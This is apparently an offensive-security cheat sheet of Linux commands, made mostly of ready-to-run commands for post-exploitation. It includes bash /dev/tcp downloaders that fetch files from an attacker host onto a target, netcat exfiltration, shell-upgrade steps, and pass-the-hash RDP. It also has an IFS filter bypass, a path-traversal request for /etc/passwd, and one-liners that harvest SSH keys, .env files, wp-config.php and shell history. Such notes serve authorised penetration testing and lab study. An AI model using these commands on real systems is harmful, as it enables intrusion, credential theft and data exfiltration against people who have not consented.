# Linux Commands

## Table of Contents

- [File Transfer](#file-transfer)
  - [Python Servers](#python-servers)
  - [Netcat](#netcat)
  - [Impacket SMB Server](#impacket-smb-server)
  - [Bash-only wget/curl](#bash-only-wgetcurl)
  - [SCP](#scp)
- [Shell Upgrading](#shell-upgrading)
- [Networking](#networking)
  - [SSH](#ssh)
  - [Port Scanning](#port-scanning)
  - [SMB](#smb)
  - [NFS](#nfs)
  - [RDP](#rdp)
- [Time and Date Sync](#time-and-date-sync)
- [Environment and Compilation](#environment-and-compilation)
  - [Environment Variables](#environment-variables)
  - [gcc Cross-Compile](#gcc-cross-compile)
  - [virtualenv](#virtualenv)
- [Utilities](#utilities)
  - [curl](#curl)
  - [iconv](#iconv)
  - [vi](#vi)
  - [Tmux](#tmux)
- [File Hunting](#file-hunting)

---

## File Transfer

### Quick Check (One-liner)

```shell
# Quick file transfer server
python3 -m http.server 80 & curl http://$lhost/$file -o /tmp/$file
```

### Python Servers

```shell
# Simple HTTP server
sudo python -m SimpleHTTPServer 80
sudo python3 -m http.server 80

# PHP server
sudo php -S 127.0.0.1:80

# Upload server
python3 -m venv venv && source venv/bin/activate && pip install uploadserver && python -m uploadserver 80
```

### Netcat

```shell
# Receiver
nc -lnvp $lport > $file

# Sender
nc $rhost $rport < $file
```

### Impacket SMB Server

```shell
sudo impacket-smbserver $share ./
sudo impacket-smbserver $share . -smb2support
impacket-smbserver kali . -username kali -password kali -smb2support

# Copy from Windows client
copy * \\$lhost\$share
```

### Bash-only wget/curl

> Useful when wget/curl are not available on target

#### wget version

```bash
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}

__wget http://$lhost/$file
```

#### curl version

```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

__curl http://$lhost/$file > $output_file
```

### SCP

```shell
scp $file $user@$rhost:/path/to/destination
scp $user@$rhost:/path/to/file ./
scp -r $folder $user@$rhost:/path/to/destination
```

---

## Shell Upgrading

### Python PTY

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Full TTY Upgrade

```shell
# After getting initial shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
stty raw -echo
fg
# Press Enter twice
export TERM=xterm
```

### Alternative with stty sizing

```shell
# Background the shell with Ctrl+Z
stty -a                    # Note rows and columns
stty raw -echo;fg
# Press Enter twice
stty rows 37 cols 123
export TERM=xterm-256color
bash
```

### Script Method

```shell
script -q /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null
```

### One-liner

```shell
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

### Fixing Staircase Effect

```shell
env reset
# or
stty onlcr
```

---

## Networking

### SSH

#### Using Outdated Algorithms

```shell
ssh $user@$rhost -oKexAlgorithms=+diffie-hellman-group1-sha1
```

#### Fixing SSH Private Key

```shell
dos2unix id_rsa
vim --clean id_rsa
chmod 600 id_rsa

# One-liner
dos2unix id_rsa; vim --clean -c 'wq' id_rsa; chmod 600 id_rsa
```

### Port Scanning

> Basic port scan with netcat or bash

```shell
# Netcat scan
for p in {1..65535}; do nc -vn $rhost $p -w 1 -z & done 2> scan_results.txt

# Bash-only scan
export ip=$rhost; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
```

### SMB

```shell
# Mount SMB share
mount.cifs //$rhost/$share /mnt/remote

# Guestmount
guestmount --add '/$mountpoint/$directory' --inspector --ro /mnt/$mount -v

# smbclient commands
smbclient -L \\\\$rhost\\ -N
smbclient -L //$rhost/ -N
smbclient -L //$rhost// -U $user%$password
smbclient //$rhost/$share
smbclient //$rhost/$share -U $user
smbclient --no-pass //$rhost/$share

# Download multiple files
mask ""
recurse ON
prompt OFF
mget *
```

### NFS

```shell
/usr/sbin/showmount -e $rhost
sudo showmount -e $rhost
sudo mount -t nfs -o vers=4,nolock $rhost:/$folder /mnt/$folder
```

### RDP

```shell
xfreerdp3 /v:$rhost /u:$user /p:$password /cert-ignore
xfreerdp3 /v:$rhost /u:$user /p:$password /d:$domain /cert-ignore
xfreerdp3 /v:$rhost /u:$user /p:$password +dynamic-resolution +clipboard
xfreerdp3 /v:$rhost /u:$user /d:$domain /pth:'$hash' +dynamic-resolution +clipboard
rdesktop $rhost
```

---

## Time and Date Sync

> Important for Kerberos attacks

### Get Server Time

```shell
sudo nmap -sU -p 123 --script "ntp-info" $rhost
```

### Disable Automatic Sync

```shell
sudo systemctl stop systemd-timesyncd
sudo systemctl disable --now chronyd
sudo /etc/init.d/virtualbox-guest-utils stop
```

### Sync Options

```shell
# net time
sudo net time -c $rhost
sudo net time set -S $rhost

# ntpdate
sudo ntpdate $rhost
sudo ntpdate -s $rhost
sudo ntpdate -b -u $rhost

# rdate
sudo rdate -n $rhost
sudo rdate -s $rhost

# timedatectl
sudo timedatectl set-timezone UTC
sudo timedatectl set-time 15:58:30
sudo timedatectl set-time '2015-11-20 16:14:50'
```

### Keep in Sync (loop)

```shell
while [ 1 ]; do sudo ntpdate $rhost; done
```

---

## Environment and Compilation

### Environment Variables

```shell
export PATH=`pwd`:$PATH
```

### gcc Cross-Compile

```shell
# Static 32-bit
gcc --static -m32 -Wl,--hash-style=both exploit.c -o exploit

# Windows cross-compile
i686-w64-mingw32-gcc -o main32.exe main.c
x86_64-w64-mingw32-gcc -o main64.exe main.c
```

### virtualenv

```shell
# Python 3
sudo apt-get install virtualenv
python3 -m virtualenv venv
. venv/bin/activate

# Python 2.7
virtualenv -p python2.7 venv
. venv/bin/activate
```

---

## Utilities

### curl

```shell
curl -v http://$domain                                                    # verbose output
curl -X POST http://$domain                                               # POST method
curl -X PUT http://$domain                                                # PUT method
curl --path-as-is http://$domain/../../../../../../etc/passwd             # handle /../ in URL
curl --proxy http://127.0.0.1:8080 http://$domain                         # use proxy
curl -F myFile=@$file http://$rhost                                       # file upload
curl${IFS}$lhost/$file                                                    # IFS bypass
```

### iconv

> Useful for encoding commands for PowerShell

```shell
echo "$command" | iconv -t UTF-16LE | base64 -w 0
echo "$command" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
iconv -f ASCII -t UTF-16LE $file.txt | base64 | tr -d "\n"
```

### vi

```shell
:w !sudo tee %    # save file with elevated privileges without exiting
```

### Tmux

#### Navigation

```text
Ctrl+b + w        # show windows
Ctrl+b + "        # split horizontal
Ctrl+b + %        # split vertical
Ctrl+b + ,        # rename window
Ctrl+b + {        # flip pane
Ctrl+b + }        # flip pane
Ctrl+b + space    # switch pane layout
```

#### Copy & Paste (vi mode)

```text
:setw -g mode-keys vi
Ctrl+b + [        # enter copy mode
space             # start selection
enter             # copy selection
Ctrl+b + ]        # paste
```

#### Search

```text
Ctrl+b + [        # enter copy mode
Ctrl + /          # search (vi mode)
n                 # next match
Shift + n         # previous match
```

#### Logging

```text
Ctrl+b then Shift+P    # start/stop logging

# Save output
Ctrl+b + :
capture-pane -S -
Ctrl+b + :
save-buffer $file.txt
```

---

## File Hunting

> Search for sensitive files on Linux systems

### Search for Passwords

```shell
# Search for files containing password
grep -rniE 'password|passwd|pwd|secret|credential' /etc /home /var/www 2>/dev/null | head -50

# Search in specific file types
find / -type f \( -name "*.txt" -o -name "*.cfg" -o -name "*.conf" -o -name "*.ini" \) -exec grep -li "password" {} \; 2>/dev/null

# Search in shell history
cat /home/*/.bash_history 2>/dev/null | grep -iE 'password|passwd|mysql|ssh|scp'
```

### Find Interesting Files

```shell
# Find SUID/SGID files
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Find writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Find files owned by current user
find / -user $(whoami) -type f 2>/dev/null

# Find recently modified files
find / -type f -mtime -7 2>/dev/null | head -50

# Find files with capabilities
getcap -r / 2>/dev/null
```

### Common Sensitive File Locations

```shell
# Database credentials
cat /var/www/*/wp-config.php 2>/dev/null
cat /var/www/*/.env 2>/dev/null
cat /var/www/*/config/*.php 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null

# Cron jobs
cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null

# History files
cat /home/*/.bash_history /root/.bash_history 2>/dev/null
```

### Quick File Hunt One-liners

```shell
# All-in-one sensitive file hunt
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.php" -o -name "*.txt" \) 2>/dev/null | xargs grep -l "password\|passwd\|secret" 2>/dev/null | head -20

# Find backup files
find / -type f \( -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*~" \) 2>/dev/null

# Find database files
find / -type f \( -name "*.sql" -o -name "*.db" -o -name "*.sqlite" \) 2>/dev/null
```

---

## See Also

- **[Windows Command](6.1.Windows-command.md)** - Windows system commands and defense evasion
- **[Reverse Shell](6.3.Reverse-Shell.md)** - Shell payloads for all platforms
- **[Linux Privilege Escalation](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - Linux privesc techniques
